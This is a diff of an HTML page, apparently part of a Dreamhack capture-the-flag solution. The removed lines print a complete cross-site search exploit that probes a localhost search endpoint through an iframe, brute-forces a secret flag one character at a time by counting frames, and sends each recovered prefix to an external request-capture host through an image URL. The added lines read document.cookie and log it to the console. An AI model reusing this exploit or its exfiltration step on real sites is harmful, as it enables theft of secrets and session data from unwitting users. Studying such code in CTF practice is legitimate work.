@@ -3,77 +3,10 @@
 <img id="img">
 
 <script>
+// 현재 페이지에 설정된 모든 쿠키를 가져옵니다.
+var allCookies = document.cookie;
 
-    async function req(url) {
-
-        return await new Promise((resolve, reject) => {
-
-            const iframe = document.getElementById("iframe");
-
-            iframe.src = url;
-
-            iframe.onload = () => { 
-
-                if (iframe.contentWindow.frames.length != 0)
-
-                    return resolve();
-
-                else
-
-                    return reject();
-
-            };
-
-        });
-
-    }
-
-    async function search(query) {
-
-        try {
-
-            await req(
-
-              `http://localhost:8000/search?query=${query}`
-
-            );
-
-            return true;
-
-        } catch (e) {
-
-            return false;
-
-        }
-
-    }
-
-    async function exploit() {
-
-        let chars = "0123456789abcdef}"
-
-        let secret = "DH{22d1445ad68e194e044a16dc644371f3";
-
-        while (!secret.includes("}")) {
-
-            for (let c of chars) {
-
-                if (await search(secret + c)) {
-
-                    secret += c;
-
-                    img.src = `https://titlttc.request.dreamhack.games/${secret}`;
-
-                    break;
-
-                }
-
-            }
-
-        }
-
-    }
-
-    exploit();
+// 가져온 쿠키를 출력합니다.
+console.log("All Cookies:", allCookies);
 
 </script>
